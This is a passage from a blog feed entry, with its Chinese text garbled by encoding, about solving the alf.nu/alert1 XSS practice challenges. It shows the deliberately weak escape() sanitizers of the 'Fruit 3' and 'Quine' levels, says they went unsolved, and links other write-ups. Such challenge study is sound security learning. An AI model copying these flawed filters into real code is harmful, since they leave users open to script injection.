class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€é¢˜æ”¹å˜äº†ç¬¬äº”è¡Œçš„ifè¯­å¥ï¼Œçœ‹ä¸å‡ºæ¥ä¼šå¸¦æ¥ä»€ä¹ˆä¸åŒçš„å½±å“ã€‚<br>è‡³å°‘å¯¹äºæˆ‘ä¸Šä¸€é¢˜çš„è§£æ³•æ²¡å½±å“ï¼Œæ‰€ä»¥ç”¨åŒæ ·çš„æ–¹æ³•å°±å¯ä»¥ã€‚<br><br><br><br><br></p><h1 id="Fruit-3"><a href="#Fruit-3" class="headerlink" title="Fruit 3"></a>Fruit 3</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.implementation.createHTMLDocument().createElement(<span class="string">'div'</span>);</span><br><span class="line">  div.innerHTML = s;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">n</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/script/i</span>.test(n.tagName)) n.parentNode.removeChild(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;n.attributes.length; i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> name = n.attributes[i].name;</span><br><span class="line">      <span class="keyword">if</span> (name !== <span class="string">'class'</span>) &#123; n.removeAttribute(name); i--; &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [].map.call(div.querySelectorAll(<span class="string">'*'</span>), f);</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ä¼šã€‚<br><br><br><br><br></p><h1 id="Quine"><a href="#Quine" class="headerlink" title="Quine"></a>Quine</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// submitted by Somebody</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// We've got a quine level in all of the other</span></span><br><span class="line">    <span class="comment">// games, so why not have one here?</span></span><br><span class="line">    <span class="keyword">var</span> win = alert;</span><br><span class="line">    <span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (t === s)</span><br><span class="line">            win(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Alert: "</span> + t + <span class="string">"\n(That's not a quine)"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å¾ˆæœ‰æ„æ€ã€‚å¯æƒœæˆ‘ä¸ä¼šå•Šã€‚<br><br><br><br><br><br>å‚è€ƒ<a href="http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/" target="_blank" rel="noopener">åšå®¢-ä¸Š</a></p><p>å‚è€ƒ<a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/" target="_blank" rel="noopener">åšå®¢-ä¸‹</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è¿™äº›å¤©åœ¨&lt;a href=&quot;https://alf.nu/alert1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;alf.nu/alert1&lt;/a&gt;ä¸Šåšäº†XSSç»ƒä¹ é¢˜ï¼Œç›®å‰å¤§éƒ¨åˆ†åšå‡ºæ¥äº†ï¼Œä½†æœ‰äº›é¢˜ç›®å¹¶ä¸æ˜¯æœ€ä¼˜è§£ã€‚è¿˜å‰©ä¸‹2é“é¢˜æ²¡æœ‰åšå‡ºï¼ˆFruit3, Qunieï¼‰ï¼Œåœ¨æ­¤åšä¸ªè®°å½•ã€‚æ¬¢è¿å¤§å®¶äº¤æµã€‚&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
